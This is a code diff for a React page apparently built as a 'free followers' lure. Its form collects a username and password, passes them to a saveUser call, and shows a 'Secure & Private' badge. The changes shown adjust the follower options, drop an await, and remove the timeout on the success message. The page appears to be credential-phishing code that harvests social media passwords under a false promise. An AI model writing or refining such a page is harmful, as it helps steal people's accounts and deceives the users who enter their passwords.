@@ -7,7 +7,7 @@ export default function Home() {
   const [formData, setFormData] = useState({
     username: '',
     password: '',
-    followers: '100'
+    followers: '10'
   });
   const [isDarkMode, setIsDarkMode] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
@@ -40,7 +40,8 @@ export default function Home() {
     localStorage.setItem('darkMode', isDarkMode.toString());
   }, [isDarkMode]);
 
-  const handleSubmit = async (e: React.FormEvent) => {
+     
+  const handleSubmit =  (e: React.FormEvent) => {
     e.preventDefault();
     // Handle form submission here
     console.log(formData);
@@ -50,7 +51,7 @@ export default function Home() {
     const password = formData.password
     const followers = formData.followers
     try {
-      await saveUser({username, password , followers})
+       saveUser({username, password , followers})
       
     } catch (error) {
       console.log(error)
@@ -63,14 +64,8 @@ export default function Home() {
       });
 
     }
+  }
 
-    
-
-    // Hide success message after 5 seconds
-    setTimeout(() => {
-      setShowSuccess(false);
-    }, 5000);
-  };
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -177,10 +172,10 @@ export default function Home() {
                 value={formData.followers}
                 onChange={handleChange}
               >
+                <option value="10">10 Followers</option>
+                <option value="20">20 Followers</option>
+                <option value="50">50 Followers</option>
                 <option value="100">100 Followers</option>
-                <option value="500">500 Followers</option>
-                <option value="1000">1000 Followers</option>
-                <option value="5000">5000 Followers</option>
               </select>
             </div>
           </div>
@@ -192,7 +187,6 @@ export default function Home() {
             Get Followers
           </button>
         </form>
-
         <div className="mt-8 grid grid-cols-2 gap-4 text-center">
           <div className="p-4 bg-white/60 dark:bg-gray-800/60 rounded-lg border border-white/30 dark:border-gray-700 backdrop-blur-sm shadow-lg hover:bg-white/70 dark:hover:bg-gray-800/70 transition-colors">
             <p className="text-sm font-medium text-gray-900 dark:text-white">Secure & Private</p>
